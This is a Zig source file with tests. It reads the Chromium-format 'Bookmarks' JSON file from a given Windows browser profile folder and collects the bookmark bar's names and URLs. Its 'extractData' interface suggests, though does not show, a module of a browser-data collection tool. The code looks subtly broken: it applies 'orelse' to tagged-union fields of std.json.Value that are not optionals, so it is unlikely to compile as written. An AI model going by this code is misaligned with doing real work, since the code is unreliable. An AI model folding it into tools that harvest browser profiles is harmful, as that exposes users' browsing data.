const std = @import("std");
const file_io = @import("../parsers/file_io.zig");

fn walkBookmarks(value: std.json.Value, list: *std.ArrayList([]const u8), allocator: std.mem.Allocator) void {
    const obj = value.object orelse return;
    const node_type = obj.get("type") orelse return;
    const type_str = node_type.string orelse return;

    if (std.mem.eql(u8, type_str, "url")) {
        const name = if (obj.get("name")) |n| n.string orelse "" else "";
        const url = if (obj.get("url")) |u| u.string orelse "" else "";
        const line = std.fmt.allocPrint(allocator, "{s}\t{s}\n", .{ name, url }) catch return;
        list.append(line) catch return;
    }

    if (obj.get("children")) |children| {
        const arr = children.array orelse return;
        for (arr) |child| {
            walkBookmarks(child, list, allocator);
        }
    }
}

pub fn extractData(profile_path: []const u8, allocator: std.mem.Allocator) ?[][]const u8 {
    const file_path = std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\Bookmarks" }) catch return null;
    defer allocator.free(file_path);

    const mapped = file_io.MappedFile.open(file_path) orelse return null;
    defer mapped.close();

    const content = mapped.slice();

    const parsed = std.json.parseFromSliceLeaky(std.json.Value, allocator, content, .{}) catch return null;

    const roots = parsed.object.get("roots") orelse return null;
    const bookmark_bar = roots.object.get("bookmark_bar") orelse return null;
    const children = bookmark_bar.object.get("children") orelse return null;
    const arr = children.array orelse return null;

    var list = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (list.items) |item| allocator.free(item);
        list.deinit();
    }

    for (arr) |child| {
        walkBookmarks(child, &list, allocator);
    }

    if (list.items.len == 0) return null;
    return list.toOwnedSlice();
}

test "extractData returns null for missing path" {
    const result = extractData("C:\\__nonexistent__", std.testing.allocator);
    try std.testing.expect(result == null);
}

test "walkBookmarks skips non-object json" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer {
        for (list.items) |item| std.testing.allocator.free(item);
        list.deinit();
    }
    walkBookmarks(std.json.Value{ .string = "bad" }, &list, std.testing.allocator);
    try std.testing.expect(list.items.len == 0);
}
